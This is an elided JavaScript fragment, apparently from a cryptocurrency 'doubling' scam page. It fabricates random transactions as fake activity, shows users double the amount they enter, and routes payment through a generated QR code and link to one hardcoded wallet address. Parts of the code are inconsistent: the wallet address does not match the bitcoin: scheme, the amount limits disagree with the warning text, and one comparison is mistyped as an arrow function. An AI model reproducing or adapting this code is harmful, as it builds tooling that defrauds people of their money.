...
function create_transaction(mins) {
  var table,
    ...
    address = get_random(),
    amount = (Math.floor(Math.random() * 9900) + 1000),
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 1000 && $('#cal-in').val() <= 100000) {
      ...
      $('#qrcode_svg').attr(
        'src',
        'https://api.qrserver.com/v1/create-qr-code/?data=bitcoin%3A0x8E99885E7448FAE912779dAAC2B5b0Ad6F2C576c%3Famount%3D' +
          amount_entered +
      ...
      $('#paynow')
        ...
        .attr(
          'href',
          'bitcoin:0x8E99885E7448FAE912779dAAC2B5b0Ad6F2C576c?amount=' +
            amount_entered +
    ...
    } else $('#warn').text('Amount should be within 1000 USDT to 2000 USDT')
  }),
  $('#close').click(() => {
  ...
  $('#cal-in').on('input', () => {
    ...
    if (in_amount >= 0 && in_amount < 5000) {
      $('#cal-out').val(in_amount * 2)
    } else if ((in_amount) => 5000 && in_amount <= 100000) {
